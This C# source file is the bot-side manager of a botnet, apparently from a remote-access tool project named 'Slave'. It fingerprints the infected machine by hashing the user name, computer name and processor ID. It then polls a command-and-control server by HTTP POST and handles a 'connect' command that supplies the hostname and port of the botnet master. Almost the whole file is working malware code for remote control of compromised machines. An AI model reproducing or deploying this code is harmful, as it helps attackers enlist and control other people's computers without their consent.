using Newtonsoft.Json;
using Slave.Core;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Management;
using System.Net.Http;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace Slave.Botnet
{
    public static class BotnetManager
    {
        /// <summary>
        /// Unique (at least trying to be...) slave identifier
        /// </summary>
        internal static string KEY;

        static readonly HttpClient httpClient;

        static readonly JsonSerializerSettings jsonSerializerSettings;

        /// <summary>
        /// Instanciate the http client
        /// and the JsonSerializerSettings object to enable error throwing on missing members during deserialization.
        /// Call the GenerateIdKey() method to create the machine ID used for the botnet master server communications
        /// </summary>
        static BotnetManager()
        {
            httpClient = new HttpClient();

            // This is required to ensure correct properties name are retrieved, and throw exceptions if not
            jsonSerializerSettings = new JsonSerializerSettings
            {
                MissingMemberHandling = MissingMemberHandling.Error
            };

            GenerateIdKey();
        }

        /// <summary>
        /// Botnet's entry point, contact the botnet master server and get commands from it
        /// </summary>
        /// <returns>Adress or ip to connect to and a port (Tuple)</returns>
        public static Tuple<string, int> Process()
        {
            var json = JsonConvert.SerializeObject(new GetCommandFromServerRequestJson());
            GetCommandFromServerResponseJson response;
            try
            {
                response = JsonConvert.DeserializeObject<GetCommandFromServerResponseJson>(
                    GetServerStringResponse(json).Result, jsonSerializerSettings);
            }
            catch (Exception)
            {
                return null;
            }

            if (response == null) return null;

            switch (response.command)
            {
                case "connect":
                    return ConnectToMaster(response.arguments);

                default:
                    // Not a valid command
                    return null;
            }
        }

        #region Botnet commands

        /// <summary>
        /// Get the hostname and port from a dictionnary
        /// </summary>
        /// <param name="arguments">Argument's dictionnary</param>
        /// <returns>Adress or ip to connect to and a port (Tuple) or null if an information wasn't found</returns>
        static Tuple<string, int> ConnectToMaster(Dictionary<string, string> arguments)
        {
            try
            {
                return new Tuple<string, int>(arguments["hostname"], int.Parse(arguments["port"]));
            }
            catch (Exception)
            {
                return null;
            }
        }

        #endregion Botnet commands

        /// <summary>
        /// Sets the KEY string : SHA256(username@comptername|processorID)
        /// </summary>
        static void GenerateIdKey()
        {
            var cpuInfo = "";
            var managementClass = new ManagementClass("win32_processor");
            var managementObjectCollection = managementClass.GetInstances();

            foreach (var managementObject in managementObjectCollection)
            {
                cpuInfo = managementObject.Properties["processorID"].Value.ToString();
                break;
            }

            var tempKey = $"{Environment.UserName}@{Environment.MachineName}|{cpuInfo}";

            using (var hash = SHA256.Create())
            {
                var encoding = Encoding.UTF8;
                var result = hash.ComputeHash(encoding.GetBytes(tempKey)).ToList();

                KEY = result.Select(x => x.ToString("x2")).Aggregate((x, y) => x + y);
            }
        }

        /// <summary>
        /// Send POST request to server and wait for his response
        /// </summary>
        /// <param name="data">Data to send in POST request</param>
        /// <returns>Server response : Task(string)</returns>
        static async Task<string> GetServerStringResponse(string data)
        {
            var parameters = new Dictionary<string, string>
            {
                ["data"] = data
            };

            var response = await httpClient.PostAsync(Config.botnetAdress, new FormUrlEncodedContent(parameters));
            var contents = await response.Content.ReadAsStringAsync();

            return contents;
        }
    }
}
